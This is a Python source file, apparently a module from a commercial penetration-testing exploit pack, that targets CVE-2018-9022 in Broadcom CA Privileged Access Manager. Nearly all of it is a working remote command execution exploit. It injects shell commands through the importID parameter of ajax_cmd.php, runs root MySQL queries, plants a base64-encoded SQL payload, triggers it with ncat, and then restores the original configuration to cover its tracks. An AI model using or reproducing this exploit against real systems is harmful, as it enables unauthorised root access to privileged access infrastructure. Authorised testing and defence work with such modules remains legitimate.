#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2019
#

import sys
import time
import os
import random
import base64
import io
import zipfile
import re
import urllib
import json

from urllib import urlopen
from sgmllib import SGMLParser

sys.path.append(".")
sys.path.append("../../")

import canvasengine
import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import tcpexploit


# GUI info
NAME = "Broadcom CA Privileged Access Manager Remote Command Execution Vulnerability"

DESCRIPTION = "Remote command execution vulnerability in Broadcom CA Privileged Access Manager"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Broadcom"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = "<= 2.8.2"
DOCUMENTATION["Date public"] = "2017.07.25"
DOCUMENTATION["References"] = "https://techdocs.broadcom.com/us/product-content/recommended-reading/security-notices/ca20180614-01--security-notice-for-ca-privileged-access-manager.html"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2018-9022" 
DOCUMENTATION["CVE Url"] = "https://nvd.nist.gov/vuln/detail/CVE-2018-9022"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["All"] ]

NOTES="""
"""

CHANGELOG="""
"""


class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.host = ""    
    self.cmd = "id"        
    self.basepath = "/"    
    self.protocol = "http"
    self.port = 80
    self.sslport = 443
    self.https = 0
    self.name = NAME
    return
	
  def exec_cmd(self, cmd):                   
    if self.https == 0:
        self.protocol = "http"
    else:
        self.protocol = "https"
        self.port = self.sslport
    
    ua = spkproxy.UserAgent("", exploit=self)
    
    url = "/ajax_cmd.php?cmd=AD_IMPORT&command=add&groupId=123&importID=|" + urllib.quote_plus(cmd) + "+2>%261||&deviceMode=test"        
    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")   
    buff = ua.GET(mainurl)               
    data = json.loads(buff)    
    return data['responseData']                       	

  def get_value(self):
    cmd = "echo select value from configuration_f where name = 'ssl_vpn_network' | mysql -u root uag"
    val = self.exec_cmd(cmd)
    return val.split('\n')[1]        

  def set_value(self, val):
    sql = "update configuration_f set value='" + val + "' where name='ssl_vpn_network'"
    cmd = "echo " + base64.b64encode(sql) + " | base64 -d | mysql -u root uag"
    self.exec_cmd(cmd)
        
  def encode_payload(self, cmd):
    sql = "update configuration_f set value='\\';" + cmd + " > /tmp/a;\\'' where name='ssl_vpn_network'"
    cmd = "echo " + base64.b64encode(sql) + " | base64 -d | mysql -u root uag"    
    return cmd
            
  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port))
    self.sslport = int(self.argsDict.get("sslport", self.sslport))
    self.https = int(self.argsDict.get("https", self.https))
    self.basepath = self.argsDict.get("basepath", self.basepath)     
    self.cmd = self.argsDict.get("cmd", self.cmd)

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s"%(NAME,self.host))
 
    val = self.get_value() 
    payload = self.encode_payload(self.cmd)
    res = self.exec_cmd(payload)        
    self.exec_cmd('echo -e openvpn\\n | ncat --send-only 127.0.0.1 2210')
    buff = self.exec_cmd('cat /tmp/a')
    res = self.set_value(val)        
    self.log('[D2] Output:\n%s'%buff.strip())        
            
    self.setInfo("%s attacking %s - done"%(NAME, self.host))
    
    return 1

  def usage(self):
    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME, VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
